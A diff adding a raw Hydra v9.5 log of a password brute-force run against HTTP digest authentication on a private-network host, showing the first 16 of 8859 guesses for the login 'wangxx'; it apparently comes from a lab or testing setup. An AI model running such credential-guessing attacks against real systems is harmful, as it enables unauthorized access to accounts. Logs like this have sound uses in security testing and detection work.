@@ -1,0 +1,21 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-14 02:18:03
+[DATA] max 1 task per 1 server, overall 1 task, 8859 login tries (l:1/p:8859), ~8859 tries per task
+[DATA] attacking http-get://192.168.100.103:80/digestauth
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asinar" - 1 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asioto" - 2 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asisig" - 3 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asiura" - 4 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asosan" - 5 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asosie" - 6 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asozan" - 7 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assabu" - 8 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assaku" - 9 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assamu" - 10 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assari" - 11 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assatu" - 12 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assetu" - 13 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asshin" - 14 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "asshou" - 15 of 8859 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.103 - login "wangxx" - pass "assyou" - 16 of 8859 [child 0] (0/0)
